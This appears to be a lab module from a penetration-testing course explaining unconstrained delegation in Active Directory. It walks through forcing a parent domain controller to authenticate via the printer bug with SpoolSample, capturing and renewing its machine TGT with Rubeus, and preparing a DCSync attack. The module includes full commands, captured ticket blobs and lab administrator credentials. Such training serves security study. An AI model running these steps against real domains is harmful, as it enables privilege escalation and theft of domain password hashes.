# Unconstrained Delegation

`Unconstrained delegation` is an Active Directory feature that allows a `service` running under a user account to `impersonate` other users and access resources `on their behalf`. This means that the service can pass the user's credentials to other services without any restrictions, potentially exposing sensitive information or allowing unauthorized access to resources. Unconstrained delegation poses a significant security risk if not properly configured.

Unconstrained delegation, the sole form of delegation available in Windows 2000, presents a significant security concern due to its unrestricted nature. When a user requests a service ticket on a server with unconstrained delegation enabled, their `Ticket Granting Ticket (TGT)` becomes embedded into the service ticket presented to the server. This allows the server to cache the ticket in memory and subsequently `impersonate` the user for further resource requests within the domain. In contrast, if unconstrained delegation is not enabled, only the user's Ticket Granting Service (TGS) ticket is stored in memory. In the event of a compromise, an attacker would only be able to access the resource specified in the TGS ticket within the user's context, limiting the potential impact of unauthorized access. Therefore, the careful management and restriction of delegation permissions are essential to mitigate the risks associated with unconstrained delegation.

![Active Directory Users and Computers window showing properties for DC02. The "Delegation" tab is selected with the option "Trust this computer for delegation to any service (Kerberos only)" enabled.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/Unconstrained_delegation_1.png)

By default, all domain controllers have `Unconstrained Delegation` enabled. This means that they possess the capability to impersonate users and access resources on their behalf without any restrictions. While unconstrained delegation facilitates seamless authentication and resource access within the domain, it also poses significant security risks if not properly managed. In default domain deployments, writable `Domain Controllers (DCs)` are typically configured to permit unconstrained delegation. This configuration implies that any user lacking the `Account is sensitive and cannot be delegated` setting on their account or not included within the `Protected Users` group will transmit their `Ticket Granting Ticket (TGT)` within a service ticket when accessing a server with unconstrained delegation enabled. Consequently, this exposes potential security vulnerabilities, as the TGT can be exploited to gain unauthorized access to resources within the domain.

There are two attack scenarios to abuse this:

1. Waiting for a privileged user to authenticate
2. Leveraging the Printer Bug

If a child domain controller (DC) which has unconstrained delegation enabled by `default` is compromised, we can potentially extract the `Ticket Granting Ticket (TGT)` of an `Administrator` from the parent DC who subsequently logs into child DC. With this TGT, we gain the ability to move laterally within the network and compromise other machines, including parent domain controller.

Alternatively, if no `user` or `Administrator` logs into the child DC from the parent DC, we can exploit the `Printer bug` to force an authentication attempt from the `parent DC` to the `child DC`. This forced authentication allows us to intercept the TGT of the machine account of the parent DC (`DC01$`). Subsequently, we can leverage this TGT to execute a `DCSync` attack, allowing us to escalate privileges and further compromise the network.

The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spools named pipe with the `RpcOpenPrinter` method and use the `RpcRemoteFindFirstPrinterChangeNotificationEx` method, to force the server to authenticate to any host provided by the client over SMB.

---

### Lab Setup

The lab configuration for all `Intra-Forest` sections is configured as shown below:

1. DC02 (Child DC) - 10.129.205.205 (DHCP) / 172.16.210.3 (dual interface)
2. DC01 (Parent DC) - 172.16.210.99

`DC02` serves as the Child Domain Controller within the domain `dev.inlanefreight.ad`, while `DC01` operates as the Parent Domain Controller within the domain `inlanefreight.ad`.

Note: Credentials for the Child DC are: `Administrator` and `HTB_@cademy_adm!`

---

### Performing the Attack

![Diagram illustrating an attack using the "printer bug" between DC02 (Child DC) and DC01 (Parent DC). Steps include authentication requests, TGT extraction, and DCsync, exploiting unconstrained delegation and two-way transitive trust.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/UD_IF.png)

Let's execute `Rubeus` to monitor stored tickets. If a `Ticket Granting Ticket (TGT)` is discovered within a `Ticket Granting Service (TGS)` ticket, Rubeus will promptly display it to us, enabling us to identify any potential security risks or access attempts within the environment.

#### Monitoring Tickets with Rubeus

  Unconstrained Delegation

```powershell-session
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs
```

Subsequently, we can execute `SpoolSample` to exploit the `printer bug`, forcing DC01 (the Parent DC) to authenticate to a host under our control, which in this case is DC02 (the Child DC). By leveraging this exploit, we can trigger an authentication attempt from the Parent DC to the Child DC, thereby facilitating the interception of DC01's Ticket Granting Ticket (TGT).

The syntax for this tool is `SpoolSample.exe <target server> <capture server>`, where the target server in our example lab is DC01 (Parent DC) and the capture server is DC02 (Child DC).

#### Abusing the Printer Bug

  Unconstrained Delegation

```powershell-session
PS C:\Tools> .\SpoolSample.exe dc01.inlanefreight.ad dc02.dev.inlanefreight.ad

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\dc01.inlanefreight.ad, CaptureServer: \\dc02.dev.inlanefreight.ad
Attempted printer notification and received an invalid handle. The coerced authentication probably worked! 
```

#### Monitoring Tickets with Rubeus

  Unconstrained Delegation

```powershell-session
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

<SNIP>
[*] 3/18/2024 9:33:05 PM UTC - Found new TGT:
User                  :  DC01$@INLANEFREIGHT.AD
StartTime             :  3/18/2024 4:29:04 PM
EndTime               :  3/19/2024 2:29:04 AM
RenewTill             :  3/25/2024 4:29:04 PM
Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable

Base64EncodedTicket   :  doIFvDCCBbigAwIBBaEDAgEWooIEuDCCBLRhggSwMIIErKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEElOTEFORUZSRUlHSFQuQUSjggRoMIIEZKADAgESoQMCAQKiggRWBIIEUiKGeH01HZmPH6nlwjHAsXxDQdgn4SHCFrQwQRpZtxJHXQPzFIIqF9t8oCv6DUuwNYjh+pPHId3un39FC56ywWuwDjlLKI1MEFwlbPScO4JASAxE09MWMxyBDwjGs6dJZAG+roiHzHhetBCkBo5qel5lM28VYhv6qe5Eg43Cxmu5BQ9TRzssrtPuwhx9UAspIzfyV7a00gMnZKX6IZKc6yU+dhGJoICeFAHcFIvjHl0+m8l6BQG25uJOtuUREwpMWJ7F1Gv8kkWHLYjKZJ6Bhu5mITSfPFFY6nHViltdMN9JYiNcnBuGnTnNp+AVZKGU8RtBU5OAbQmYOJWCBSKY+R7ysPwwIeYBuiZ1gazmXVxellEnK2DAdkQNUp/nYxdZNM8CtNv<SNIP>
```

We can use this ticket to get a new valid TGT in memory using the `renew` option in Rubeus.

#### Renew a Ticket for DC01$

  Unconstrained Delegation

```powershell-session
PS C:\Tools> .\Rubeus.exe renew /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEuDCCBLRhggSwMIIErKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEElOTEFORUZSRUlHSFQuQUSjggRoMIIEZKADAgESoQMCAQKiggRWBIIEUiKGeH01HZmPH6nlwjHAsXxDQdgn4SHCFrQwQRpZtxJHXQPzFIIqF9t8oCv6DUuwNYjh+pPHId3un39FC56ywWuwDjlLKI1MEFwlbPScO4JASAxE09MWMxyBDwjGs6dJZAG+roiHzHhetBCkBo5qel5lM28VYhv6qe5Eg43Cxmu5BQ9TRzssrtPuwhx9UAspIzfyV7a00gMnZKX6IZKc6yU+dhGJoICeFAHcFIvjHl0+m8l6BQG25uJOtuUREwpMWJ7F1Gv8kkWHLYjKZJ6Bhu5mITSfPFFY6nHViltdMN9JYiNcnBuGnTnNp+AVZKGU8RtBU5OAbQmYOJWCBSKY+R7ysPwwIeYBuiZ1gazmXVxellEnK2DAdkQNUp/nYxdZNM8CtNv<SNIP> /ptt

______        _
(_____ \      | |
_____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v2.2.3

[*] Action: Renew Ticket
[*] Using domain controller: DC01.INLANEFREIGHT.AD (172.16.210.99)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.AD\DC01$'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

doIFvDCCBbigAwIBBaEDAgEWooIEuDCCBLRhggSwMIIErKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSi
JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEElOTEFORUZSRUlHSFQuQUSjggRoMIIEZKADAgESoQMCAQKiggRW
BIIEUuKuCTqqOb27PfL+NC1GZO0dLdk9GbT+Si0JRe7B66YfHuI1AiOgaUfF5oABcA3V8B0pn7Iy0BxY
RPkXKO4iVuTDEqZty+AGMgfBB/r5JzRg2Pe39ezmeGY9QAJPcmZKRQeB6CvpM/fr3YbAjvVQzSjP5gsF
3TomugNyDSbGcNMqgx10Ii2bsC9VHVrTwV0iRBiwpV3DklgM2dswGHiXmpXhp4+0YNG3cfaghPqL2Rg1
Jy21o//hBrICTeZj+mngo8lTT2mxwRmG5bnP5VLoz31j0suOYG/7UNYtq2IG5E/ElrODG3EZwEcn4+/K
PPY4dVeTLozvSQrTjqu9vPTSVHZuVnXspieJ0RV8RONjOSfmyHGRS32kZm7CerQ+ETWZ2LZfDeFz09if
DVpf7jTT5UIPR2pCgYmd6fa8Htj/fS90/7xj7O+m1ubWs/7W9XgE0vKyLCFHZh7y2jPUftTpglP8QCoj
hSrM/fA2jbNVHa95WbSxSPNaJBvrPLb+I1Z5VZXGwGIUluiHEIMTM0MTXiaIbUf0v1qtihNC7N5XSqyk
nguSnCCcuLdC0ICdbZj0PE5ciz2BjPCFo8EOaBbw5+DAA84pyiS4amn0VxzQ6jp1J79WoZfR6/d0IMoP
focxi60tMkgUwoSCiCmZVUK2iMcNlduxzXSPZnOGNzZwiLOJ6DzrywRS2ocT4uG2DKKtk+H//Bta5h63
6Vr1QboHDUgRtSq/yEGxQAyIyzSmrEGptVFowU3xzeObkFv9f5y/srg/olABxouz8Fi8WS03RMceVaI3
GpDyNiUqA8wXHbgIqPzEy9VWIAU7Ryp2DhZoNVuHPXZOTJdmTMCS4I/e+/Zx5WRvBL17GnSoT+iD20ZI
MnVKIwrovSAdFYQSOKOlKOhywlHdC9w/1WGivWWLEDEkNF4f0mnfPz2dapnMdHgKPp0Q0n0Pfa2MzU6P
CAlROgDdFOtQnZP3qpxuk1/h1rr4xyzpiUSzOfYjUGDIYPKbgMc0zG+YXfO1n77V6jPLjoBt+pC4vvVB
wBDgUv/XNccZbqfxS4rCLisIkfXa3e/OXNqNnL3sel/mXNtnsaR1+i4pexxjSIMcL378kmpFR0lJDl3A
zxx3Hug4Ikdh8LXkmaCtxcxs8cwhTiHc4b39Qc2VJri4kfNDc4QHDa0FVSy2NmYw6+tl3aV41iMOkGWY
gy8zM2BXqAkyb4w98yS5/JRw59VivHTWB9OpCtZ8gCCdB5kmzfBtkiUaGG5Gog8YSQg90JAT/+hdvXaS
<SNIP>

[+] Ticket successfully imported!

```

With the acquired Ticket Granting Ticket (TGT) of `DC01$` in memory, obtained through the `renew` option in Rubeus, we will be able to execute the `DCsync` attack. This attack would allow retrieval of the `NTLM password hash` of any targeted user within the domain, exploiting the privileged access granted by the compromised TGT.

